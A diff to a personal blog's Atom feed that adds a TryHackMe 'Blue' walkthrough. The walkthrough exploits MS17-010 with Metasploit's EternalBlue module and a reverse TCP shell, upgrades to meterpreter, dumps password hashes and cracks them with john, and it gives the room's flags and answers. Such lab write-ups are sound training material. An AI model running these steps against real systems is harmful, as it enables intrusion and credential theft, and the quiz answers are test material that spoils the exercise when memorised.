@@ -1,4 +1,246 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-15T18:19:37+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Pickle Rick</title><link href="http://localhost:4000/tryhackme-pickle-rick/" rel="alternate" type="text/html" title="TryHackMe - Pickle Rick" /><published>2023-03-15T00:00:00+03:00</published><updated>2023-03-15T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-pickle-rick</id><content type="html" xml:base="http://localhost:4000/tryhackme-pickle-rick/"><![CDATA[<p>This is an easy CTF. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. 
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-16T16:40:06+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Blue</title><link href="http://localhost:4000/tryhackme-blue/" rel="alternate" type="text/html" title="TryHackMe - Blue" /><published>2023-03-16T00:00:00+03:00</published><updated>2023-03-16T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-blue</id><content type="html" xml:base="http://localhost:4000/tryhackme-blue/"><![CDATA[<p><br /></p>
+
+<h2 id="1-recon">1. Recon</h2>
+
+<p>Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.</p>
+
+<p><br /></p>
+
+<h3 id="11-how-many-ports-are-open-with-a-port-number-under-1000">1.1 How many ports are open with a port number under 1000?</h3>
+
+<p>Let’s find out how many ports are open on the target with a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.173.132
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/nmap.png" alt="nmap" /></p>
+
+<p>As you can see, there are 3 ports under 1000. These are 135/tcp, 139/tcp, and 445/tcp.</p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">3</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="12-what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms--ex-ms08-067">1.2 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</h3>
+
+<p>For more detailed information, let’s do a more detailed nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.173.132
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/nmap2.png" alt="nmap2" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	445/tcp   open  microsoft-ds   Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+</code></pre></div></div>
+
+<p>Now, we’re searching in the browser, to see if we can find anything.</p>
+
+<p><img src="/assets/img/tryhackme/blue/search.png" alt="search" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">MS17-010</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="2-gain-access">2. Gain Access</h2>
+
+<p>Exploit the machine and gain a foothold.</p>
+
+<p><br /></p>
+
+<h3 id="21-find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code-ex-exploit">2.1 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/……..)</h3>
+
+<p><img src="/assets/img/tryhackme/blue/rapid.png" alt="rapid" /></p>
+
+<p>Now, let’s apply them to ourselves.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 &gt; show targets
+msf6 &gt; set target 1
+msf6 &gt; set payload windows/x64/shell/reverse_tcp
+msf6 &gt; show options
+msf6 &gt; set RHOSTS 10.10.173.132
+msf6 &gt; set LHOST 10.8.86.168
+msf6 &gt; exploit
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/set.png" alt="set" /></p>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/blue/in.png" alt="in" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="22-show-options-and-set-the-one-required-value-what-is-the-name-of-this-value-all-caps-for-submission">2.2 Show options and set the one required value. What is the name of this value? (All caps for submission)</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">RHOSTS</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="3-escalate">3. Escalate</h2>
+
+<p>Escalate privileges, learn how to upgrade shells in metasploit.</p>
+
+<p><br /></p>
+
+<h3 id="31-if-you-havent-already-background-the-previously-gained-shell-ctrl--z-research-online-how-to-convert-a-shell-to-meterpreter-shell-in-metasploit-what-is-the-name-of-the-post-module-we-will-use-exact-path-similar-to-the-exploit-we-previously-selected">3.1 If you haven’t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</h3>
+
+<p><em>Hint: shell_to_meterpreter</em></p>
+
+<p>We put the session opened with CTRL+Z in the background.</p>
+
+<p><img src="/assets/img/tryhackme/blue/ses.png" alt="ses" /></p>
+
+<p>We make a search using the hint.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; search shell_to_meterpreter
+&gt; use 0
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/post.png" alt="post" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">post/multi/manage/shell_to_meterpreter</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="32-select-this-use-module_path-show-options-what-option-are-we-required-to-change">3.2 Select this (use MODULE_PATH). Show options, what option are we required to change?</h3>
+
+<p>Now we have to configure which Session shell to upgrade meterpreter. We can see the Session by running the following command.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -l
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/l.png" alt="l" /></p>
+
+<p>Set the session-id according to your session. We can use the following command to configure the session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; show options
+&gt; set SESSION 1
+</code></pre></div></div>
+<p><img src="/assets/img/tryhackme/blue/id.png" alt="id" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">SESSION</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="33-exploit">3.3 Exploit</h3>
+
+<p>After making the adjustments, we run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; run
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/run.png" alt="run" /></p>
+
+<p>After the new session opened select the session and execute that session.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -l
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/ses2.png" alt="ses2" /></p>
+
+<p>Now execute the new session by running the following command.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; sessions -i 2
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/i2.png" alt="i2" /></p>
+
+<p>And we are inside.</p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="4-cracking">4. Cracking</h2>
+
+<p>Dump the non-default user’s password and crack it!</p>
+
+<p><br /></p>
+
+<h3 id="41-within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user">4.1 Within our elevated meterpreter shell, run the command ‘hashdump’. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; hashdump
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/hashdump.png" alt="hashdump" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">jon</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="42-copy-this-password-hash-to-a-file-and-research-how-to-crack-it-what-is-the-cracked-password">4.2 Copy this password hash to a file and research how to crack it. What is the cracked password?</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashdump.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/john.png" alt="john" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">alqfna22</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="5-find-flags">5. Find flags!</h2>
+
+<p>Find the three flags planted on this machine. These are not traditional flags, rather, they’re meant to represent key locations within the Windows system. Use the hints provided below to complete this room!</p>
+
+<p><br /></p>
+
+<h3 id="51-flag1-this-flag-can-be-found-at-the-system-root">5.1 Flag1? This flag can be found at the system root.</h3>
+
+<p>Let’s move to the root directory to see how the file system looks like.</p>
+
+<p><img src="/assets/img/tryhackme/blue/flag1.png" alt="flag1" /></p>
+
+<p>Our first flag is located at the root of C:\</p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{access_the_machine}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="52-flag2-this-flag-can-be-found-at-the-location-where-passwords-are-stored-within-windows">5.2 Flag2? This flag can be found at the location where passwords are stored within Windows.</h3>
+
+<p>Let’s find out where the other flags are.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; shell
+&gt; dir *flag* /s /b 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/blue/shell.png" alt="shell" /></p>
+
+<p>Content of other flags.</p>
+
+<p><img src="/assets/img/tryhackme/blue/flags.png" alt="flags" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{sam_database_elevated_access}</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="53-flag3-this-flag-can-be-found-in-an-excellent-location-to-loot-after-all-administrators-usually-have-pretty-interesting-things-saved">5.3 flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.</h3>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">flag{admin_documents_can_be_valuable}</code></strong>
+<br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="windows," /><category term="eternal blue," /><category term="MS17-010" /><summary type="html"><![CDATA[]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blue.gif" /><media:content medium="image" url="http://localhost:4000/assets/img/blue.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Pickle Rick</title><link href="http://localhost:4000/tryhackme-pickle-rick/" rel="alternate" type="text/html" title="TryHackMe - Pickle Rick" /><published>2023-03-15T00:00:00+03:00</published><updated>2023-03-15T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-pickle-rick</id><content type="html" xml:base="http://localhost:4000/tryhackme-pickle-rick/"><![CDATA[<p>This is an easy CTF. This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle. 
 Deploy the virtual machine on this task and explore the web application: “http://target-ip/”</p>
 
 <p><br /></p>
